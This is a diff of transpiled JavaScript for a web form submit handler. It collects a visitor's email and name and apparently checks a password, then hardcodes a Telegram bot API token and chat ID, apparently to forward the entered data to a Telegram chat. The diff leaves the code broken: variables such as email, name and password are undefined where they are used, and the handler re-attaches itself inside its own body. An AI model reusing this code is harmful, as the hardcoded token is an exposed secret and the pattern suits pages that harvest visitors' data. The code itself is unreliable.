@@ -106,28 +106,76 @@ window.inpEmail.addEventListener('input', checkEmailLenght);
 document.addEventListener('DOMContentLoaded', checkEmailLenght); // #endregion
 
 function formSubmit(event) {
-  var email, name, apiToken, chatId, text;
+  var apiToken, chatId, text, EMAIL_MIN_LENGHT, mediumRegex, testNameRegex, checkEmailLenght, resetValidation, validateForm;
   return regeneratorRuntime.async(function formSubmit$(_context) {
     while (1) {
       switch (_context.prev = _context.next) {
         case 0:
-          email = window.inpEmail.value;
-          name = window.inpName.value;
+          validateForm = function _ref6(event) {
+            event.preventDefault();
+            resetValidation();
+            var email = window.inputEmail.value;
+            var name = window.inputName.value;
+
+            if (!email) {
+              window.emailHelp.classList.remove('d-none');
+              return false;
+            }
+
+            if (!password) {
+              window.nameHelp.classList.remove('d-none');
+              return false;
+            }
+
+            if (!testNameRegex(password)) {
+              window.nameHelp.classList.remove('d-none');
+              window.nameHelpDescription.classList.remove('d-none');
+            }
+          };
+
+          resetValidation = function _ref5() {
+            window.emailHelp.classList.add('d-none');
+            window.nameHelp.classList.add('d-none');
+            window.nameHelpDescription.classList.add('d-none');
+          };
+
+          checkEmailLenght = function _ref4() {
+            var valueLenght = window.inputEmail.value.length;
+            var diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
+
+            if (diff) {
+              window.emailDiffCount.textContent = diff;
+              window.emailLenghtHelp.classList.remove('d-none');
+            } else {
+              window.emailLenghtHelp.classList.add('d-none');
+            }
+          };
+
+          testNameRegex = function _ref3(value) {
+            return mediumRegex.test(value);
+          };
+
+          apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
+          chatId = "-4066219312";
           event.preventDefault();
 
           if (!(!email || !name)) {
-            _context.next = 5;
+            _context.next = 9;
             break;
           }
 
           return _context.abrupt("return", false);
 
-        case 5:
-          apiToken = "6685344433:AAFe9Yea_lcKqx1dzqTdsWtfcIJus5QMg2U";
-          chatId = "-4066219312";
+        case 9:
           text = "\n    Email: ".concat(email, "    \n    Name: ").concat(name, "\n    ");
+          EMAIL_MIN_LENGHT = 5;
+          mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");
+          ;
+          ; // window.inputEmail.addEventListener('input', checkEmailLenght);
 
-        case 8:
+          window.form.addEventListener('submit', formSubmit); // document.addEventListener('DOMContentLoaded', checkEmailLenght);
+
+        case 15:
         case "end":
           return _context.stop();
       }
